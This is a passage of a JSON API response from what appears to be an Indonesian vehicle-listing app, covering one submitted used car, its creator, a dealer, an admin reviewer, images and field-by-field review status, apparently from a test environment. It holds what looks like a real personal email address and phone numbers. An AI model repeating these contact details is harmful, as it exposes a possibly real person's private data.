            ""vehicle_group"": null,
            ""vehicle_otrs"": null,
            ""vehicle_series_image"": null,
            ""vehicle_series_thumbnail"": null,
            ""vehicle_category"": null,
            ""synced_by_user"": null
        },
        ""created_by_user"": {
            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
            ""name"": ""Gorengan"",
            ""email"": ""mufkalif18@gmail.com"",
            ""phone_number"": ""6287824412129"",
            ""last_login_at"": 0,
            ""last_seen_at"": 0,
            ""verified_at"": 1695352377,
            ""email_verified_at"": 1713248282,
            ""email_verif_exp_at"": 1713259034,
            ""phone_verified_at"": 1714638996,
            ""deactivated_at"": 0,
            ""reactivation_req_at"": 0,
            ""register_source"": ""google"",
            ""created_at"": 1695350727,
            ""updated_at"": 1714638996,
            ""deleted_at"": 0,
            ""user_info"": {
                ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                ""alt_email"": """",
                ""phone_number"": ""6287824412312"",
                ""alt_phone_number"": """",
                ""place_of_birth"": """",
                ""date_of_birth"": """",
                ""media_id"": null,
                ""ktp_verified_at"": 1712290801,
                ""ktp_verification_status"": ""verified"",
                ""total_point"": 400,
                ""total_coupon"": -1,
                ""created_at"": 1694626580,
                ""updated_at"": 1714463341,
                ""deleted_at"": 0,
                ""scan_ktp"": null,
                ""spouse_scan_ktp"": null,
                ""ktp_submitted"": false,
                ""ktp_submission_activity_id"": """",
                ""media"": null
            },
            ""user_roles"": [
                {
                    ""role_id"": ""80eb53b5-a584-418c-9907-ee3e418a99b0"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""approve_at"": 0,
                    ""created_at"": 1701240189,
                    ""updated_at"": 1701240189,
                    ""deleted_at"": 0,
                    ""role"": {
                        ""role_id"": ""80eb53b5-a584-418c-9907-ee3e418a99b0"",
                        ""name"": ""Customer""
                    }
                }
            ],
            ""user_dealer"": null,
            ""history_status"": null,
            ""has_pin"": false,
            ""dealer"": null
        },
        ""dealer"": {
            ""dealer_id"": ""475d3274-6a26-40b3-8983-3be0dd681922"",
            ""name"": ""ajajaj"",
            ""company_name"": """",
            ""dealer_entity_id"": ""36354721-b10e-4225-b9ae-899a0c98a7f2"",
            ""dealer_category_id"": ""2400fda1-a3ec-4e57-a531-afc2a2e8e317"",
            ""code"": ""667733344"",
            ""status"": ""active"",
            ""created_by"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
            ""created_at"": 1705403038,
            ""updated_at"": 1708338576,
            ""deleted_at"": 0,
            ""dealer_entity"": {
                ""dealer_entity_id"": ""36354721-b10e-4225-b9ae-899a0c98a7f2"",
                ""name"": ""Badan Hukum (PT/Koperasi/Yayasan)"",
                ""created_at"": 1694696738,
                ""updated_at"": 1694696738,
                ""deleted_at"": 0
            },
            ""dealer_category"": {
                ""dealer_category_id"": ""2400fda1-a3ec-4e57-a531-afc2a2e8e317"",
                ""name"": ""Authorized Dealer"",
                ""updated_at"": 1694696553,
                ""created_at"": 1694696553,
                ""deleted_at"": 0
            },
            ""dealer_address"": {
                ""dealer_address_id"": ""f5758a9e-5cbd-49cc-bcbd-ccec1a5150e7"",
                ""dealer_id"": ""475d3274-6a26-40b3-8983-3be0dd681922"",
                ""area_id"": ""f5dc3e2e-dea6-49e4-ba5a-1e1d61d655c2"",
                ""branch_id"": ""fc49005b-305a-4c2f-90fd-4f8c78de964f"",
                ""city_id"": ""566d4627-732c-446e-8606-b9db7b45aa67"",
                ""address"": ""6 Banten Kecamatan Ciputat Serua Indonesia, 15414"",
                ""latitude"": -6.309489,
                ""longitude"": 106.7052382,
                ""geotag_media_id"": ""2967f144-a1c3-4159-9a4d-def98188f854"",
                ""created_at"": 1705403038,
                ""updated_at"": 1705403038,
                ""deleted_at"": 0,
                ""dealer"": null,
                ""area"": null,
                ""geotag_media"": null,
                ""branch"": null,
                ""city"": null
            },
            ""dealer_grades"": [
                {
                    ""dealer_grade_id"": ""7b2d61cc-485f-40c9-ab64-155f98c7484f"",
                    ""dealer_id"": ""475d3274-6a26-40b3-8983-3be0dd681922"",
                    ""grade_id"": ""87a26199-12ae-4d22-837f-54d1396fa02b"",
                    ""vehicle_type_id"": ""669f7b6e-e80c-4290-8e07-7357564a0408"",
                    ""periode"": """",
                    ""created_at"": 1705403038,
                    ""updated_at"": 1705403038,
                    ""deleted_at"": 0,
                    ""dealer"": null,
                    ""grade"": {
                        ""grade_id"": ""87a26199-12ae-4d22-837f-54d1396fa02b"",
                        ""name"": ""Undefined"",
                        ""hex_color"": ""#4399D1"",
                        ""created_at"": 1706887762,
                        ""updated_at"": 1706887762,
                        ""deleted_at"": 0
                    },
                    ""vehicle_type"": {
                        ""vehicle_type_id"": ""669f7b6e-e80c-4290-8e07-7357564a0408"",
                        ""name"": ""Motor Baru"",
                        ""vehicle_group_id"": ""112202f2-5512-4468-b40e-e811e6d0f7be"",
                        ""code"": ""001"",
                        ""code_mapping"": ""NM"",
                        ""created_at"": 0,
                        ""updated_at"": 0,
                        ""deleted_at"": 0,
                        ""vehicle_group"": null
                    }
                }
            ],
            ""dealer_proofs"": [
                {
                    ""dealer_proof_id"": ""9a9d380e-eefd-4cb9-bba7-e08f424f1359"",
                    ""dealer_id"": ""475d3274-6a26-40b3-8983-3be0dd681922"",
                    ""dealer_doc_id"": ""e5c1a288-3192-45fe-9dbc-c8476b557780"",
                    ""media_id"": ""c60bd5ef-5935-4352-a08c-b28064840fa1"",
                    ""approved_at"": 1707192898,
                    ""rejected_at"": 0,
                    ""reason"": """",
                    ""replaced_at"": 0,
                    ""follow_up_by"": ""6fc8e022-bbd0-4656-9a01-9730cf41c08b"",
                    ""created_at"": 1705403038,
                    ""updated_at"": 1707192898,
                    ""deleted_at"": 0,
                    ""dealer"": null,
                    ""dealer_doc"": {
                        ""dealer_doc_id"": ""e5c1a288-3192-45fe-9dbc-c8476b557780"",
                        ""name"": ""SIUP"",
                        ""position"": 4,
                        ""code"": ""SIUP"",
                        ""is_show"": true,
                        ""created_at"": 1694696222,
                        ""updated_at"": 1694696222,
                        ""deleted_at"": 0
                    },
                    ""media"": {
                        ""media_id"": ""c60bd5ef-5935-4352-a08c-b28064840fa1"",
                        ""path"": ""dealer/document/1705403008.pdf"",
                        ""size"": 119055,
                        ""mimetype"": ""application/pdf"",
                        ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                        ""name"": ""1705403008.pdf"",
                        ""purpose"": ""dealer-document"",
                        ""created_at"": 1705403008,
                        ""deleted_at"": 0,
                        ""media_url"": ""https://muf-superapps.imgix.net/dealer/document/1705403008.pdf?w=500"",
                        ""user"": null
                    },
                    ""follow_up_user"": null
                }
            ],
            ""dealer_info"": {
                ""dealer_id"": ""475d3274-6a26-40b3-8983-3be0dd681922"",
                ""name_pic"": ""yuuu"",
                ""phone_number"": ""0897690770"",
                ""email"": ""yey@mail.com"",
                ""ktp_owner"": ""Direktur/Owner"",
                ""scan_ktp_id"": ""2c08efe0-5004-4e35-8f78-929d425ec2be"",
                ""created_at"": 1705403038,
                ""updated_at"": 1705403038,
                ""deleted_at"": 0,
                ""dealer"": null,
                ""scan_ktp"": null
            },
            ""created_by_user"": null,
            ""history_status"": null
        },
        ""approved_by_user"": null,
        ""updated_by_user"": null,
        ""assignee"": {
            ""user_id"": ""6fc8e022-bbd0-4656-9a01-9730cf41c08b"",
            ""name"": ""Admin Elemes"",
            ""email"": ""admin@admin.com"",
            ""phone_number"": ""6288811112222"",
            ""last_login_at"": 0,
            ""last_seen_at"": 0,
            ""verified_at"": 0,
            ""email_verified_at"": 0,
            ""email_verif_exp_at"": 0,
            ""phone_verified_at"": 0,
            ""deactivated_at"": 0,
            ""reactivation_req_at"": 0,
            ""register_source"": """",
            ""created_at"": 1694626579,
            ""updated_at"": 1709881565,
            ""deleted_at"": 0,
            ""user_info"": {
                ""user_id"": ""6fc8e022-bbd0-4656-9a01-9730cf41c08b"",
                ""alt_email"": """",
                ""phone_number"": ""6288811112222"",
                ""alt_phone_number"": """",
                ""place_of_birth"": """",
                ""date_of_birth"": """",
                ""media_id"": ""8a1d4f57-a016-43ee-958c-b82fc1165890"",
                ""ktp_verified_at"": 0,
                ""ktp_verification_status"": ""none"",
                ""total_point"": 0,
                ""total_coupon"": 0,
                ""created_at"": 1705032266,
                ""updated_at"": 1709881565,
                ""deleted_at"": 0,
                ""scan_ktp"": null,
                ""spouse_scan_ktp"": null,
                ""ktp_submitted"": false,
                ""ktp_submission_activity_id"": """",
                ""media"": {
                    ""media_id"": ""8a1d4f57-a016-43ee-958c-b82fc1165890"",
                    ""path"": ""community/post/image/1709862674.jpg"",
                    ""size"": 197601,
                    ""mimetype"": ""image/jpeg"",
                    ""user_id"": ""6fc8e022-bbd0-4656-9a01-9730cf41c08b"",
                    ""name"": ""1709862674.jpg"",
                    ""purpose"": ""image"",
                    ""created_at"": 1709862674,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps.imgix.net/community/post/image/1709862674.jpg?w=500"",
                    ""user"": null
                }
            },
            ""user_roles"": null,
            ""user_dealer"": null,
            ""history_status"": null,
            ""has_pin"": false,
            ""dealer"": null
        },
        ""vehicle_images"": [
            {
                ""vehicle_image_id"": ""5e4e13bd-0374-45d9-a374-f0ef7c64b7ec"",
                ""image_id"": ""139bd21e-30ab-4eeb-868e-1aa38eb8584a"",
                ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""vit_id"": ""4f0daecb-d4ce-4593-bff3-cd79f8d8cd1b"",
                ""created_at"": 1714364288,
                ""updated_at"": 1715933762,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""4f0daecb-d4ce-4593-bff3-cd79f8d8cd1b"",
                    ""name"": ""Tampak Depan"",
                    ""position"": 1,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""9ce69e6f-2865-485e-b8b4-dac8b6173529"",
                    ""wrong_car_image_id"": ""80eed9d9-7f3f-496e-af92-05d7e8dfa538"",
                    ""correct_mcy_image_id"": ""7bf7b7d7-e1d7-4520-a318-685d6625dbdd"",
                    ""wrong_mcy_image_id"": ""93a7f050-1634-43b7-bfa5-25f5f6777f7e"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""139bd21e-30ab-4eeb-868e-1aa38eb8584a"",
                    ""path"": ""vehicle/1715933759.jpg"",
                    ""size"": 145194,
                    ""mimetype"": ""image/jpeg"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""name"": ""1715933759.jpg"",
                    ""purpose"": ""vehicle"",
                    ""created_at"": 1715933759,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1715933759.jpg?w=500"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""6eea94c6-e115-4515-bea1-94399c572928"",
                ""image_id"": ""3d1cb2c3-235f-497a-9787-03542bce494a"",
                ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""vit_id"": ""94d995ae-989d-4384-bfe6-4c5c4e927bdc"",
                ""created_at"": 1714364288,
                ""updated_at"": 1714364288,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""94d995ae-989d-4384-bfe6-4c5c4e927bdc"",
                    ""name"": ""Tampak Samping Kanan"",
                    ""position"": 2,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""3419d840-21f0-4cfe-878e-61cd3deed67f"",
                    ""wrong_car_image_id"": ""7fac074a-8c52-4b48-8fc0-ecbd9e604b1d"",
                    ""correct_mcy_image_id"": ""41ed93fe-9614-412a-aaa2-d75f3507ebae"",
                    ""wrong_mcy_image_id"": ""aea6b171-298c-466f-9d6f-8e8b9e05dbc6"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""3d1cb2c3-235f-497a-9787-03542bce494a"",
                    ""path"": ""vehicle/1714364210.png"",
                    ""size"": 689178,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""name"": ""1714364210.png"",
                    ""purpose"": ""vehicle"",
                    ""created_at"": 1714364210,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364210.png?w=500"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""bae1c183-e1f9-4305-b02a-f76197da2b0f"",
                ""image_id"": ""92dc89b6-9172-4c0c-acaf-87084f698d9a"",
                ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""vit_id"": ""8335ed3b-9380-48e1-85c1-42ffa1e2dea6"",
                ""created_at"": 1714364288,
                ""updated_at"": 1714364288,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""8335ed3b-9380-48e1-85c1-42ffa1e2dea6"",
                    ""name"": ""Tampak Samping Kiri"",
                    ""position"": 3,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""aa2ef5f0-0dcf-4584-aba6-0812e588e334"",
                    ""wrong_car_image_id"": ""0d1610d7-0491-4cb3-87c1-7bfe69c3c421"",
                    ""correct_mcy_image_id"": ""38a371cb-95c0-453e-9fb6-fb5f1289170c"",
                    ""wrong_mcy_image_id"": ""b2bffb2e-4235-41fd-b4c9-d041e931c0a0"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""92dc89b6-9172-4c0c-acaf-87084f698d9a"",
                    ""path"": ""vehicle/1714364227.png"",
                    ""size"": 689178,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""name"": ""1714364227.png"",
                    ""purpose"": ""vehicle"",
                    ""created_at"": 1714364227,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364227.png?w=500"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""3d80f3b0-6cbf-4f8b-828b-c59ebd165077"",
                ""image_id"": ""fa86ca46-5f83-4183-b4bf-da9b7c4b8b7a"",
                ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""vit_id"": ""b8aeade6-4de9-4b46-be02-0a4d1994602c"",
                ""created_at"": 1714364288,
                ""updated_at"": 1714364288,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""b8aeade6-4de9-4b46-be02-0a4d1994602c"",
                    ""name"": ""Tampak Belakang"",
                    ""position"": 4,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""3e0810af-11f1-415c-9b35-92a74acb7afe"",
                    ""wrong_car_image_id"": ""7400d055-ff0f-488e-a549-17158a167abe"",
                    ""correct_mcy_image_id"": ""5bef6f5d-0d36-4a0f-af17-e4e5d7775af7"",
                    ""wrong_mcy_image_id"": ""e78903fd-7cde-45c7-be3e-ad369f6e33db"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""fa86ca46-5f83-4183-b4bf-da9b7c4b8b7a"",
                    ""path"": ""vehicle/1714364239.png"",
                    ""size"": 689178,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""name"": ""1714364239.png"",
                    ""purpose"": ""vehicle"",
                    ""created_at"": 1714364239,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364239.png?w=500"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""a12fdd5b-324c-4c03-80b6-5269d9eddc3a"",
                ""image_id"": ""fef108de-e6ab-4a7c-b9db-376674b28c15"",
                ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""vit_id"": ""00746412-72cc-46fd-b6b7-64f16e0276f7"",
                ""created_at"": 1714364288,
                ""updated_at"": 1714364288,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""00746412-72cc-46fd-b6b7-64f16e0276f7"",
                    ""name"": ""Spidometer Kendaraan"",
                    ""position"": 5,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""00197df4-5101-43c4-839a-0224f6460461"",
                    ""wrong_car_image_id"": ""7885432a-19bf-4d9d-95c9-8d1f6827d53b"",
                    ""correct_mcy_image_id"": ""aee37887-2b12-4339-8ad2-05c9c0fcd9fa"",
                    ""wrong_mcy_image_id"": ""8779ab94-c9e2-4a13-8db6-5ec6b4513958"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""fef108de-e6ab-4a7c-b9db-376674b28c15"",
                    ""path"": ""vehicle/1714364254.png"",
                    ""size"": 689178,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""name"": ""1714364254.png"",
                    ""purpose"": ""vehicle"",
                    ""created_at"": 1714364254,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364254.png?w=500"",
                    ""user"": null
                }
            }
        ],
        ""history_status"": null,
        ""user_dealer"": null,
        ""wishlisted"": false,
        ""firestore_room_id"": """",
        ""submission_data"": {
            ""vehicle_information"": {
                ""city"": {
                    ""uv_submission_id"": ""94767877-1cd7-4021-9ba5-8cb0ecc170d2"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Lokasi Kendaraan"",
                    ""field"": ""city"",
                    ""old_value"": null,
                    ""value"": {
                        ""city_id"": ""5a78bb52-7868-4ebb-ad42-5cd18f15e103"",
                        ""created_at"": 1702442413,
                        ""deleted_at"": 0,
                        ""name"": ""Aceh Barat Daya"",
                        ""position"": 100,
                        ""province"": {
                            ""created_at"": 1702435790,
                            ""deleted_at"": 0,
                            ""name"": ""Nanggroe Aceh Darussalam (NAD)"",
                            ""province_id"": ""7bfdb9cf-7340-415b-b952-11edcd9bf2af"",
                            ""updated_at"": 1702435790
                        },
                        ""province_id"": ""7bfdb9cf-7340-415b-b952-11edcd9bf2af"",
                        ""updated_at"": 1702442413
                    },
                    ""comment"": """",
                    ""approved_at"": 1715744726,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 1,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""is_plate_number_even"": {
                    ""uv_submission_id"": ""0b5a238c-0d4f-4e4f-b7d9-a62f5d3a28d5"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Plat Kendaraan"",
                    ""field"": ""is_plate_number_even"",
                    ""old_value"": null,
                    ""value"": false,
                    ""comment"": """",
                    ""approved_at"": 1715744726,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 7,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""license_plate"": {
                    ""uv_submission_id"": ""4a532e47-0866-4b0d-8b0e-9dbb699df42b"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Plat Kendaraan"",
                    ""field"": ""license_plate"",
                    ""old_value"": null,
                    ""value"": ""AA"",
                    ""comment"": """",
                    ""approved_at"": 1715744726,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 6,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""odometer"": {
                    ""uv_submission_id"": ""12f3fc01-439d-4b93-a7ce-4e52af126def"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Kilometer"",
                    ""field"": ""odometer"",
                    ""old_value"": null,
                    ""value"": 2400,
                    ""comment"": """",
                    ""approved_at"": 1715744726,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 8,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""vehicle_brand"": {
                    ""uv_submission_id"": ""402cf33a-a8d5-4355-a32d-f2bb26f08206"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Merk Kendaraan"",
                    ""field"": ""vehicle_brand"",
                    ""old_value"": null,
                    ""value"": {
                        ""code"": ""003"",
                        ""created_at"": 1691577703,
                        ""deleted_at"": 0,
                        ""media"": null,
                        ""media_id"": ""82bcc828-8ba5-4d20-be5d-805a78bc38d7"",
                        ""name"": ""ASTON MARTIN"",
                        ""updated_at"": 1691577703,
                        ""vehicle_brand_id"": ""56c7ad8e-e6cd-4358-ab3b-e2fb443da2e3"",
                        ""vehicle_group"": null,
                        ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4""
                    },
                    ""comment"": """",
                    ""approved_at"": 1715744726,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 2,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""vehicle_color"": {
                    ""uv_submission_id"": ""1d22149b-fe63-48aa-9193-820d9b0b3f7c"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Warna Kendaraan"",
                    ""field"": ""vehicle_color"",
                    ""old_value"": null,
                    ""value"": {
                        ""created_at"": 1702731982,
                        ""deleted_at"": 0,
                        ""hex"": ""#D0D5DD"",
                        ""name"": ""Silver"",
                        ""updated_at"": 1702731982,
                        ""vehicle_color_id"": ""75e87802-5e7d-46f9-a6a9-3cf8271ef403""
                    },
                    ""comment"": """",
                    ""approved_at"": 1715744726,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 5,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""vehicle_variant"": {
                    ""uv_submission_id"": ""1ed000cb-ec47-4a10-af7c-39f5d21fb111"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Model Kendaraan"",
                    ""field"": ""vehicle_variant"",
                    ""old_value"": null,
                    ""value"": {
                        ""vehicle_variant_id"": ""f7f62586-ae2d-4ce5-b96c-c23a9da00009"",
                        ""name"": ""AMR A Fierce New Breed"",
                        ""vehicle_series_id"": ""62264377-a71c-4b46-8119-8789cb22656c"",
                        ""vehicle_brand_id"": ""56c7ad8e-e6cd-4358-ab3b-e2fb443da2e3"",
                        ""vehicle_category_id"": ""f991e8e2-2b0d-40f7-902f-181e24974a44"",
                        ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                        ""vehicle_fuel_id"": ""7f5ceae2-24ff-4add-a3ca-97352cb1443f"",
                        ""vehicle_transmission_id"": ""5a395636-3a47-432f-997f-cc215f80fe1e"",
                        ""vehicle_type_id"": ""b32b65cb-3a97-4bfb-bf24-07f7cd07457d"",
                        ""code"": """",
                        ""moas_id"": null,
                        ""is_recommended"": false,
                        ""is_popular"": false,
                        ""is_trending"": false,
                        ""created_at"": 1701253610,
                        ""updated_at"": 1701253610,
                        ""deleted_at"": 0,
                        ""all_specs"": null,
                        ""vehicle_series"": null,
                        ""vehicle_brand"": null,
                        ""vehicle_category"": null,
                        ""vehicle_group"": null,
                        ""vehicle_fuel"": null,
                        ""vehicle_transmission"": null,
                        ""vehicle_specs"": null,
                        ""vehicle_otr"": null,
                        ""vehicle_type"": null
                    },
                    ""comment"": """",
                    ""approved_at"": 1715744726,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 3,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""year"": {
                    ""uv_submission_id"": ""44e7936c-a80b-4a3b-b652-2286537ee937"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_information"",
                    ""label"": ""Tahun"",
                    ""field"": ""year"",
                    ""old_value"": 2022,
                    ""value"": 2020,
                    ""comment"": ""masih salah uyyy"",
                    ""approved_at"": 0,
                    ""rejected_at"": 1715936329,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 4,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                }
            },
            ""vehicle_condition"": {
                ""ac_condition"": {
                    ""uv_submission_id"": ""91ec51fd-94dd-4ebc-b339-472e001cc079"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_condition"",
                    ""label"": ""Kondisi A/C"",
                    ""field"": ""ac_condition"",
                    ""old_value"": null,
                    ""value"": ""normal"",
                    ""comment"": """",
                    ""approved_at"": 1715744748,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 10,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""body_condition"": {
                    ""uv_submission_id"": ""f7476621-a57e-4e11-a65e-e873efa3a54d"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_condition"",
                    ""label"": ""Kondisi Body Kendaraan"",
                    ""field"": ""body_condition"",
                    ""old_value"": null,
                    ""value"": ""Baret ringan"",
                    ""comment"": """",
                    ""approved_at"": 1715744748,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 12,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""description"": {
                    ""uv_submission_id"": ""191087cf-9df5-4daa-afc5-37a7c1841431"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_condition"",
                    ""label"": ""Deskripsi"",
                    ""field"": ""description"",
                    ""old_value"": null,
                    ""value"": ""Ini mau disii dengan apa"",
                    ""comment"": """",
                    ""approved_at"": 1715744748,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 15,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""flood_damage"": {
                    ""uv_submission_id"": ""1ecea73f-4936-43d8-bcb0-be942369f14c"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_condition"",
                    ""label"": ""Riwayat Banjir"",
                    ""field"": ""flood_damage"",
                    ""old_value"": null,
                    ""value"": false,
                    ""comment"": """",
                    ""approved_at"": 1715744748,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 13,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""ownership_status"": {
